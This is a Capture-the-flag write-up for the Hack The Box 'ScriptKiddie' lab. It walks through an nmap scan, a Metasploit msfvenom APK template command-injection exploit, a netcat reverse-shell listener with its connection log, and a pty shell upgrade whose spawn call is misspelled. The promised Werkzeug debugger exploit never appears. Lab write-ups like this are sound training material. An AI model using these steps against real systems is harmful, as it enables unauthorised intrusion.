---
title: "HTB Writeup 1: Werkzeug"
date: 2020-03-18T07:56:03+00:00
# weight: 1
# aliases: ["/first"]
tags: ["hack the box"]
author: Nate
# author: ["Me", "You"] # multiple authors
showToc: false
TocOpen: false
draft: false
hidemeta: false
comments: false
description: "A completely unnecessary hack."
disableHLJS: true # to disable highlightjs
disableShare: true
disableHLJS: false
searchHidden: true
cover:
    image: "<image path/url>" # image path/url
    alt: "<alt text>" # alt text
    caption: "<text>" # display caption under cover
    relative: false # when using page bundles set this to true
    hidden: true # only hide on current single page

---

### Messing with the Werkzeug Vulnerability in ScriptKiddie

As stated in the description, this is a very unnecessary hack.  
However, I wanted to test out the Werkzeug vulnerability and the  
ScriptKiddie box allowed me to do so without a lot of setup. This writeup  
will show you how to get the user flag, but after that it simply details  
how to enable the Werkzeug debugger vulnerability and exploit it.
All just for fun!  

#### Background:

**Werkzeug**  

A comprehensive WSGI web application library. It began as a simple collection of various utilities for WSGI applications and has become one of the most advanced WSGI utility libraries.  

Werkzeug comes with an intuitive debugger console that accepts Python scripts.  
the issue arises when debugging is enabled in a production environment.  
When the debugger console is available, so is the potential to put down a Python shell.  


#### Scanning the box

We're starting off with a fairly simple Nmap scan for this one:  
`nmap -A 10.10.10.226`  

Here's the output:

```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 3c:65:6b:c2:df:b9:9d:62:74:27:a7:b8:a9:d3:25:2c (RSA)
|   256 b9:a1:78:5d:3c:1b:25:e0:3c:ef:67:8d:71:d3:a3:ec (ECDSA)
|_  256 8b:cf:41:82:c6:ac:ef:91:80:37:7c:c9:45:11:e8:43 (ED25519)
5000/tcp open  http    Werkzeug httpd 0.16.1 (Python 3.8.5)
|_http-server-header: Werkzeug/0.16.1 Python/3.8.5
|_http-title: k1d'5 h4ck3r t00l5
```

This is what initially sent me down the Werkzeug path. Being that this is and easy  
capture the flag box. It would make sense that this is the vulnerability they  
added...but that's not the case!  

Since it's running a web application though, we should check out what they've built.

#### Reverse shell  

The site has a few features built in like running an Nmap scan or building a reverse shell   
payload (guess that's why this one is titled ScriptKiddie). The reverse shell feature has  
an option to upload a template file. This is where things get fun.  

We can use **msvenom** to create a reverse shell pretty quickly.  
It looks like the site accepts a few different file types based on operating system.  
Let's select Android since that's definitely a .apk file.  

`msfconsole > use exploit/unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection`  

Using that template, set the LHOST and LPORT to your local information.  
and set the RHOST and RPORT to the ScriptKiddie box information.  

annnnnd "exploit"

Now, before we do anything with this file let's set up a netcat listener on our machine:  

`nc -nlvp <port>` (I like to use port 1234, but take your pick)  

Head back to the site and select the .apk file you just generated and upload it.  
Don't forget to type in your IP on the host box and select Android from the dropdown menu.  
Upload your file and head back to your listener!  

```  

  └─# nc -nlvp 4444           
      listening on [any] 4444 ...
      connect to [10.10.14.14] from (UNKNOWN) [10.10.10.226] 35962

```

#### Capture the flag!

We have a shell now! (Well sort of). Doesn't seem to be interactive yet.  
Python comes with a great module called Pseudo-terminal Utilities.  
We can use this to our advantaged to spawn a bash shell and interact with the machine.  

`python3 -c "import pty;pty.pawn('/bin/bash')"`  

If nothing happens at first try just hitting enter or waiting a minute...it is Python...  

You should see an interactive terminal now under the user 'kid.'  

kid@scriptkiddie:~/html$  

Snoop around for a bit and you should find the user.txt flag!  
